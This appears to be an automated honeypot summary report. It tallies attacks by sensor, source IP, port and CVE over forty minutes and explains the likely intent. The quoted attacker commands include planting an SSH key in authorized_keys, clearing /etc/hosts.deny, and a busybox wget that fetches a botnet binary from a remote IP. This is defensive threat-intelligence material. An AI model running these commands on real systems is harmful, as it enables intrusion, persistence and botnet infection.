**Honeypot Attack Summary Report**

*   **Report Generation Time:** 2025-10-03T08:01:33Z
*   **Timeframe:** 2025-10-03T07:20:01Z - 2025-10-03T08:00:01Z
*   **Files Used:** `agg_log_20251003T072001Z.json`, `agg_log_20251003T074001Z.json`, `agg_log_20251003T080001Z.json`

**Executive Summary**

This report summarizes 16,694 attacks recorded by honeypots over a period of approximately 40 minutes. The majority of attacks were captured by the Cowrie honeypot, with significant activity also observed on Mailoney, Ciscoasa, Suricata, and Sentrypeer. Attackers primarily originated from IP addresses 176.65.141.117 and 23.175.48.211. The most targeted ports were 25 (SMTP), 5060 (SIP), and 445 (SMB). A number of CVEs were targeted, and attackers attempted various commands, primarily focused on reconnaissance and establishing persistent access.

**Detailed Analysis**

**Attacks by Honeypot**
*   Cowrie: 6437
*   Ciscoasa: 2629
*   Mailoney: 2487
*   Suricata: 2411
*   Sentrypeer: 1610
*   Honeytrap: 807
*   Dionaea: 105
*   Tanner: 86
*   Redishoneypot: 43
*   H0neytr4p: 48
*   Adbhoney: 8
*   ElasticPot: 9
*   Honeyaml: 9
*   ConPot: 3
*   Miniprint: 2

**Top Attacking IPs**
*   176.65.141.117
*   23.175.48.211
*   101.95.153.214
*   115.190.54.120
*   86.54.42.238
*   185.156.73.166
*   92.63.197.55
*   202.83.162.167
*   57.128.190.44
*   158.174.210.161
*   196.251.80.30
*   122.166.49.42
*   154.221.23.24
*   92.63.197.59

**Top Targeted Ports/Protocols**
*   25
*   5060
*   TCP/445
*   22
*   445
*   80
*   443
*   6379
*   TCP/22
*   3306
*   23

**Most Common CVEs**
*   CVE-2002-0013 CVE-2002-0012
*   CVE-2019-11500 CVE-2019-11500
*   CVE-2021-3449 CVE-2021-3449
*   CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
*   CVE-2006-3602 CVE-2006-4458 CVE-2006-4542
*   CVE-2006-2369
*   CVE-2018-10562 CVE-2018-10561
*   CVE-2023-26801 CVE-2023-26801
*   CVE-1999-0183

**Commands Attempted by Attackers**
*   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
*   `lockr -ia .ssh`
*   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
*   `cat /proc/cpuinfo | grep name | wc -l`
*   `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
*   `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
*   `ls -lh $(which ls)`
*   `which ls`
*   `crontab -l`
*   `w`
*   `uname -m`
*   `cat /proc/cpuinfo | grep model | grep name | wc -l`
*   `top`
*   `uname`
*   `uname -a`
*   `whoami`
*   `lscpu | grep Model`
*   `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
*   `Enter new UNIX password:`
*   `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
*   `tftp; wget; /bin/busybox ZSEAJ`
*   `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

**Signatures Triggered**
*   ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
*   ET DROP Dshield Block Listed Source group 1
*   ET SCAN NMAP -sS window 1024
*   ET INFO Reserved Internal IP Traffic
*   ET SCAN MS Terminal Server Traffic on Non-standard Port
*   ET CINS Active Threat Intelligence Poor Reputation IP group 50
*   ET CINS Active Threat Intelligence Poor Reputation IP group 51
*   ET DROP Spamhaus DROP Listed Traffic Inbound group 32

**Users / Login Attempts**
*   345gs5662d34/345gs5662d34
*   root/3245gs5662d34
*   root/nPSpP4PBW0
*   root/LeitboGi0ro
*   root/2glehe5t24th1issZs
*   foundry/foundry
*   test/zhbjETuyMffoL8F
*   superadmin/admin123
*   root/Aa123.com
*   walter/1234
*   root/Test_1234
*   postgres/Admin@123

**Files Uploaded/Downloaded**
*   sh
*   arm.urbotnetisass
*   arm5.urbotnetisass
*   arm6.urbotnetisass
*   arm7.urbotnetisass
*   x86_32.urbotnetisass
*   mips.urbotnetisass
*   mipsel.urbotnetisass
*   gpon80&ipv=0
*   fonts.gstatic.com
*   css?family=Libre+Franklin...
*   ie8.css?ver=1.0
*   html5.js?ver=3.7.3

**HTTP User-Agents**
*   *No user agents recorded in this period.*

**SSH Clients**
*   *No SSH clients recorded in this period.*

**SSH Servers**
*   *No SSH servers recorded in this period.*

**Top Attacker AS Organizations**
*   *No AS organizations recorded in this period.*

**Key Observations and Anomalies**

*   A significant number of commands are related to reconnaissance of the system hardware and user environment.
*   The command to remove and replace `.ssh/authorized_keys` is a common technique for attackers to maintain persistent access to a compromised machine.
*   The `urbotnetisass` files downloaded suggest an attempt to install a botnet client on the honeypot, with different architectures being targeted.
*   The Suricata signatures for DoublePulsar suggest that some of the SMB traffic is related to the EternalBlue exploit.
*   The variety of usernames and passwords attempted indicates a brute-force approach, with a mix of default credentials and common passwords.